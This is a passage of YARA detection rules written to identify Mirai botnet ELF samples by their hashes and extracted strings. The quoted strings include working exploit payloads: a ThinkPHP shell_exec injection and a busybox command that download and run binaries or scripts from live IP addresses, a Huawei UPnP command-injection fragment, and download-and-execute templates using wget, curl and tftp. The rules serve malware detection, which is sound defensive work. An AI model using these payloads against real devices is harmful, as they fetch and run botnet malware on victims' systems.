      hash78 = "5f47b1f2a3103c025f7a8acabcebc6fe3ca174dd8ae7d75c99eb7aca8b7edfa1"
      hash79 = "5f7fc8f6f5d1acadfd7ead7ef70cca05e9ae407fabd1fd43013a6d12c99de727"
      hash80 = "601bcbe1143470e0cff30904e691687556a99d0805a3f1b90621cc1061290d1c"
      hash81 = "602724b6059c2c028ee2a0c3815cee2a935d33c13a6d13e7502ad46e94034294"
      hash82 = "60302a1e56b5dc34f0605d2edb62e06b0ea609fc22ece7a62fdc9aca252afc4e"
      hash83 = "6054a3372689b61538628ef382792d6e7a4a34951e8bde1de6f04215a16109c1"
      hash84 = "61d7073593cab5fa679a8f232057534fb9950d7342e5fd9f1ae2bc66e02b33a4"
      hash85 = "64130060020e26c72ebb7aa9580988fe5bf51f5bb782b0082fadb138ae1b944a"
      hash86 = "6424bb7a6ecc915a4fc3c93c533475e2b5b42d713432583fb54e0c9374bcbcf3"
      hash87 = "651779aabd025294cc8e22c9e75b0e499a6a1ab36b9ff1ec73a5d80f5736eef9"
      hash88 = "654826d8630bf9b3276e8c6ba79635a793efd946cd99df89f6e2cc52917bde1c"
      hash89 = "6604b582473738a39d8f2e92457cb827189d262b751c408b17bdabf38832734d"
      hash90 = "67036276b4fbe0afd07661cd49c3ce727a84141c77684d520f47a95323d59dbd"
      hash91 = "67a6972acf50ac27b5f7e1190edfc7cfb2946eb0185979a841960e446ab0b726"
      hash92 = "67f0fa8bb928264b187c86a0309bd3dcb334bd370e767b25b099dabb33b59f14"
      hash93 = "6819b249e0842cc8048c9820ceefb17645c1758c2ded8cebffe9fef6c216e3c2"
      hash94 = "69a44dc7723a16f56805b9bc3aafa118e4333f7e8d91bb0ce8f4a3ff1cebf894"
      hash95 = "6a5af377c1edc2ad608b197a0d6549650ad693230e678812a1e97bc6ffc5bf5e"
      hash96 = "6bfb2a7b07e99847de1cfb1549d92097a4e8ef3293de9f5951e66af12d86a076"
      hash97 = "6c7d17e718fd500f16f7d4e900d5e80309b00fd2de3d241e249ba0772faf2b26"
   strings:
      $s1 = "cd %s && tftp -g -r %s %s" fullword ascii /* score: '23.00'*/
      $s2 = "tftp %s -c get %s %s" fullword ascii /* score: '20.00'*/
      $s3 = "ftpget -v -u anonymous -p anonymous -P 21 %s %s %s" fullword ascii /* score: '20.00'*/
      $s4 = "wget http://%s/%s/%s -O %s" fullword ascii /* score: '19.00'*/
      $s5 = "curl -o %s http://%s/%s/%s" fullword ascii /* score: '18.00'*/
      $s6 = "/usr/sbin/ftpget" fullword ascii /* score: '12.00'*/
      $s7 = "/usr/sbin/tftp" fullword ascii /* score: '12.00'*/
      $s8 = "/usr/sbin/wget" fullword ascii /* score: '12.00'*/
      $s9 = "/usr/bin/tftp" fullword ascii /* score: '9.00'*/
      $s10 = "/usr/bin/ftpget" fullword ascii /* score: '9.00'*/
      $s11 = "/usr/bin/wget" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__2443540b_Mirai_signature__3065e1e0_Mirai_signature__497bbcee_27 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_2443540b.elf, Mirai(signature)_3065e1e0.elf, Mirai(signature)_497bbcee.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2443540bb4244183a1bad2b14fe0cde7e5913944f2dbc559f94fc5d01704f57b"
      hash2 = "3065e1e091e77481c003213baaae32a1632b35d37c47b69366898dd2cadf958f"
      hash3 = "497bbceeecb7a06730c68d34100d3a948d49987ea35c9ac02cf90377ca1dfbe0"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '44.00'*/
      $x2 = "pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://212.16.87.33/bins/x86 -O thonkphp ; ch" ascii /* score: '40.00'*/
      $x3 = "pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://212.16.87.33/bins/x86 -O thonkphp ; ch" ascii /* score: '37.00'*/
      $s4 = " -g 89.144.20.51 -l /tmp/binary -r /mips; /bin/busybox chmod 777 * /tmp/binary; /tmp/binary mips)</NewStatusURL><NewDownloadURL>" ascii /* score: '30.00'*/
      $s5 = " /bin/busybox wget http://212.16.87.33/zyxel.sh; chmod +x zyxel.sh; ./zyxel.sh" fullword ascii /* score: '27.00'*/
      $s6 = "POST /cgi-bin/ViewLog.asp HTTP/1.1" fullword ascii /* score: '27.00'*/
      $s7 = "User-Agent: Uirusu/2.0" fullword ascii /* score: '17.00'*/
      $s8 = "User-Agent: python-requests/2.20.0" fullword ascii /* score: '17.00'*/
      $s9 = "GET /index.php?s=/index/" fullword ascii /* score: '16.00'*/
      $s10 = "Host: 192.168.0.14:80" fullword ascii /* score: '14.00'*/
      $s11 = "mod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" fullword ascii /* score: '11.00'*/
      $s12 = "$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s13 = "Content-Length: 227" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 200KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _Mirai_signature__2b37a8e3_Mirai_signature__31a18daa_Mirai_signature__36bb77da_Mirai_signature__3aea5a40_Mirai_signature__3b_28 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_2b37a8e3.elf, Mirai(signature)_31a18daa.elf, Mirai(signature)_36bb77da.elf, Mirai(signature)_3aea5a40.elf, Mirai(signature)_3b46c349.elf, Mirai(signature)_3bef84f1.elf, Mirai(signature)_3f6cfadb.elf, Mirai(signature)_44999d62.elf, Mirai(signature)_4da560aa.elf, Mirai(signature)_5d9434fc.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2b37a8e3ec622f8ae9c3ac30aef1dfbb4af56ebe9a66675a0c40a5c61478d995"
      hash2 = "31a18daa6603dd7005b15fd5cb925d7f7096aab83cf191825b30e58b3cbf8633"
      hash3 = "36bb77da16b12417510a0663735488cf4393e02518bbcf39e05d23c1449ae3ed"
      hash4 = "3aea5a400d17dc668a67377eb012a5db00909644152679f834659dbac35e37f2"
      hash5 = "3b46c349abed5ce9921e875eea04c890d03f1950d653a8a4821aa2a68d8a2970"
      hash6 = "3bef84f1d7f50a9c06d68d1b43c5a124c698a704d89f1c2b050563fa1c119b9d"
      hash7 = "3f6cfadb698f450df2cdf6773d73ebce336eaa21bcd85e5e8271b382ac66841b"
      hash8 = "44999d62550d79ea67ace000bfe5d83cafd6678decb14da5b841db9d33de70e0"
      hash9 = "4da560aad4f0960291ff354fca76f10d16864614d04d8c49863ef5c5a837127b"
      hash10 = "5d9434fc00c92e10bcf72fdce59c9546ee52d60df8ac5af9d525f25404576b98"
   strings:
      $s1 = "all._spf.mimecast.comaaaa.weberdns.dea.weberdns.decname.weberdns.detxt.weberdns.de_sip._tcp.weberdns.deip-documentation.weberdns" ascii /* score: '24.00'*/
      $s2 = "tiktok.com" fullword ascii /* score: '21.00'*/
      $s3 = "live.com" fullword ascii /* score: '21.00'*/
      $s4 = "omany.ultradns-geo.organy.edgecastcdn.netlarge.spf.trusteddomain.orgdkim20._domainkey.godaddy.comtxt.awsdns-hostedzone-info.coma" ascii /* score: '21.00'*/
      $s5 = "ns.bizdnssec.ripe.netdnssec-failed.orgroot-dnssec.netlarge-dns.akamai.comdns-bigresponse.cloudns.netlarge.txt.research.umbrella." ascii /* score: '20.00'*/
      $s6 = "dnssec-root.iana.orgk.root-servers.netdnssec-failover.cloudflare.comany.dns.oracle.comany.dns.akamai-edge.netany.microsoft-dns.c" ascii /* score: '20.00'*/
      $s7 = ".dehost-dane-self.weberdns.dehost-dnssec.weberdns.deany.isc.organy.cdn77.comany.awsdns-00.organy.cloudflare-dnssec.netany.ultrad" ascii /* score: '19.00'*/
      $s8 = "dns-bigresponse.cloudns.netlarge.txt.research.umbrella.com" fullword ascii /* score: '18.00'*/
      $s9 = "combigtxt.dns-oarc.netipv6.ripe.netaaaa.nasa.govipv6.google.comipv6.research.ix.ruipv6.6bone.netroot-servers.netdnssec.icann.org" ascii /* score: '16.00'*/
      $s10 = "nasa.gov" fullword ascii /* score: '10.00'*/
      $s11 = "all._spf.mimecast.comaaaa.weberdns.dea.weberdns.decname.weberdns.detxt.weberdns.de_sip._tcp.weberdns.deip-documentation.weberdns" ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__23da5558_Mirai_signature__27cbf20e_Mirai_signature__3063b1a9_Mirai_signature__31a18daa_Mirai_signature__32_29 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_23da5558.elf, Mirai(signature)_27cbf20e.elf, Mirai(signature)_3063b1a9.elf, Mirai(signature)_31a18daa.elf, Mirai(signature)_327f7742.elf, Mirai(signature)_355bf0ff.elf, Mirai(signature)_3bef84f1.elf, Mirai(signature)_3c1f8a07.elf, Mirai(signature)_46645355.elf, Mirai(signature)_4a7822f1.elf, Mirai(signature)_4afabac3.elf, Mirai(signature)_4da560aa.elf, Mirai(signature)_4ff2888d.elf, Mirai(signature)_5425f5a3.elf, Mirai(signature)_5d9434fc.elf, Mirai(signature)_66df8c92.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "23da555858c0104bd60b3e918efd5d9f362b8cf4c4523224f3f39dd4a47ad2f7"
      hash2 = "27cbf20e47f3b5e974e7528ef90d1985311b4e598cc5a8700ee9259d56d9fe24"
      hash3 = "3063b1a98d934b80c77ec0b515220a62eb41af84be1bde5fb2d65757e5f32c6b"
      hash4 = "31a18daa6603dd7005b15fd5cb925d7f7096aab83cf191825b30e58b3cbf8633"
      hash5 = "327f774238181fdd64123535b46bfc91dc7223dddfc0cd9d8bec50a1f5c9616b"
      hash6 = "355bf0ff2d4b5c1344d3e4c4a368d2d64fa95654755de0944496d8b535c6dc4b"
      hash7 = "3bef84f1d7f50a9c06d68d1b43c5a124c698a704d89f1c2b050563fa1c119b9d"
      hash8 = "3c1f8a07291f0ac25e35a4a659a95cc2fdceba7b722be84600a904368e188433"
      hash9 = "46645355a0ebd219ba433ee099cb4f044d59d1257d804b1e740cb9988ab96769"
      hash10 = "4a7822f12e54a5dc79e7fac4a6073461177a7e51f6963077483dd46e90867903"
      hash11 = "4afabac36401a8e799ec775086c6ec86a5309f9226deb3bd39505ffffefe3345"
      hash12 = "4da560aad4f0960291ff354fca76f10d16864614d04d8c49863ef5c5a837127b"
      hash13 = "4ff2888d814764a478499fa27ba3831f9ce0395aacdd0da779127d9027a778e1"
      hash14 = "5425f5a34e61ffbe876966b0a139c818bd48f0b87465e0d50716625cd44f4a54"
      hash15 = "5d9434fc00c92e10bcf72fdce59c9546ee52d60df8ac5af9d525f25404576b98"
      hash16 = "66df8c92290d8f74324f289cd60bb9fbf6aa20aac78c02becf583b3fad2c9a73"
   strings:
      $s1 = "Origin: https://www.amazon.com" fullword ascii /* score: '21.00'*/
      $s2 = "Origin: https://www.google.com" fullword ascii /* score: '21.00'*/
      $s3 = "Origin: https://www.linkedin.com" fullword ascii /* score: '21.00'*/
      $s4 = "Origin: https://www.facebook.com" fullword ascii /* score: '21.00'*/
      $s5 = "Origin: https://www.twitter.com" fullword ascii /* score: '21.00'*/
      $s6 = "Referer: https://www.twitter.com/" fullword ascii /* score: '17.00'*/
      $s7 = "Referer: https://www.linkedin.com/" fullword ascii /* score: '17.00'*/
      $s8 = "Referer: https://www.amazon.com/" fullword ascii /* score: '17.00'*/
      $s9 = "Referer: https://www.facebook.com/" fullword ascii /* score: '17.00'*/
      $s10 = "X-Forwarded-Host: %s" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

